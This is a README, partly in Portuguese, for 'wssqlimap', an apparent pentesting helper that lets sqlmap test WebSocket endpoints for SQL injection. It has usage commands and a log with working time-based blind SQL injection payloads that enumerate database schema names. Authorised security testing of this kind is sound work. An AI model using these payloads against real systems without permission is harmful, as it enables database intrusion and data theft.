<img width=100% src="https://capsule-render.vercel.app/api?type=waving&color=0000FF&height=120&section=header"/>

[![Typing SVG](https://readme-typing-svg.herokuapp.com/?color=0000FF&size=32&center=true&vCenter=true&width=1000&height=30&lines=wssqlimap)](https://git.io/typing-svg)



<h4 align="center">Script to perform WebSocket test focusing on SQLI</h4>


<p align="center">
  <a href="#instalação">Install</a> •
  <a href="#executando-websocket">Usage</a>
</p>

---

O wssqlimap é uma ferramenta de realizar teste em websocket com vulnerabilidade de SQL Injection deixando ele mais performático no pentester.

# Forma de utilização

```sh
wssqlimap --ws "ws://teste:9000/" --lhost 127.0.0.1 --lport 6060
```
Isso exibirá a ajuda para a ferramenta. Aqui estão todos os switches que ele suporta:
```yaml
usage: wssqlimap --ws "ws://teste:9000/" --lhost 127.0.0.1 --lport 6060

options:
  -h, --help            show this help message and exit
  --ws WEBSOCKET, -W WEBSOCKET Insert the websocket for the test
  --lhost HOST          Enter your ip. Default=127.0.0.1
  --lport PORT          Enter your port. Default=80

```

# Instalação

O wssqlimap requer **python3** e para baixá-lo só usar:

```sh
git clone https://github.com/joaoviictorti/wssqlimap
```

# Executando WebSocket

```console
python3 wssqlimap.py --ws "ws://teste.com:9091/" --lhost 127.0.0.1 --lport 6060
Use esse comando em outro terminal para realização da injeção com sqlmap: sqlmap -u "http://ip:port/?id=123" -p id .....

127.0.0.1 - - [29/Dec/2022 15:39:29] "GET /?id=1%20AND%20%28SELECT%206390%20FROM%20%28SELECT%28SLEEP%285-%28IF%28ORD%28MID%28%28SELECT%20DISTINCT%28IFNULL%28CAST%28schema_name%20AS%20NCHAR%29%2C0x20%29%29%20FROM%20INFORMATION_SCHEMA.SCHEMATA%20LIMIT%201%2C1%29%2C6%2C1%29%29%3E64%2C0%2C5%29%29%29%29%29iTrK%29 HTTP/1.1" 200 -
127.0.0.1 - - [29/Dec/2022 15:39:34] "GET /?id=1%20AND%20%28SELECT%206390%20FROM%20%28SELECT%28SLEEP%285-%28IF%28ORD%28MID%28%28SELECT%20DISTINCT%28IFNULL%28CAST%28schema_name%20AS%20NCHAR%29%2C0x20%29%29%20FROM%20INFORMATION_SCHEMA.SCHEMATA%20LIMIT%201%2C1%29%2C6%2C1%29%29%3E96%2C0%2C5%29%29%29%29%29iTrK%29 HTTP/1.1" 200 -
```

<img width=100% src="https://capsule-render.vercel.app/api?type=waving&color=0000FF&height=120&section=footer"/>